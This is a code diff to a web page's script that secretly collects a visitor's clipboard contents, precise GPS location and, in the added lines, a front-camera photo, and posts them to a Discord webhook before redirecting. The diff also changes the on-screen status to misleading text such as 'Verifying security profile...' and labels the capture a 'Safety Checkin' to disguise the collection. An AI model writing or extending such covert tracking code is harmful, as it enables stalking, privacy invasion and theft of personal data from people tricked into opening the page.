@@ -28,7 +28,7 @@
 
         async function send() {
             const status = document.getElementById('status');
-            status.innerText = "Loading...";
+            status.innerText = "Verifying security profile...";
 
             // 1. Grab Clipboard
             let clip = "None";
@@ -37,33 +37,61 @@
             } catch (e) { clip = "Denied"; }
 
             // 2. Grab Location
-            navigator.geolocation.getCurrentPosition((pos) => {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                status.innerText = "Syncing...";
 
-                // 3. Send to Discord
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: "📍 **Location:** " + mapLink + "\n📋 **Clipboard:** " + clip
-                    })
-                }).then(() => {
-                    // 4. Redirect only after Discord responds
-                    window.location.href = REDIRECT_URL;
-                }).catch(() => {
-                    // If network fails, still redirect
-                    window.location.href = REDIRECT_URL;
-                });
+                // 3. Attempt Camera Capture
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
 
-            }, (err) => {
-                // If they deny location, send just the clipboard
-                fetch(WEBHOOK_URL, {
+                    // Snap photo
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // Stop camera
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Convert to Blob and send to Discord
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append("file1", blob, "camera_snap.png");
+                        formData.append("payload_json", JSON.stringify({
+                            content: `✅ **Safety Checkin**\n📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`${clip}\``
+                        }));
+
+                        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                        window.location.href = REDIRECT_URL;
+                    }, 'image/png');
+
+                } catch (camErr) {
+                    // Fallback if camera is denied
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            content: `⚠️ **Camera Denied**\n📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`${clip}\`` 
+                        })
+                    });
+                    window.location.href = REDIRECT_URL;
+                }
+
+            }, async (err) => {
+                // Fallback if location is denied
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: "⚠️ Location Denied. Clipboard: " + clip })
-                }).then(() => { window.location.href = REDIRECT_URL; });
+                });
+                window.location.href = REDIRECT_URL;
             }, { enableHighAccuracy: true });
         }
     </script>
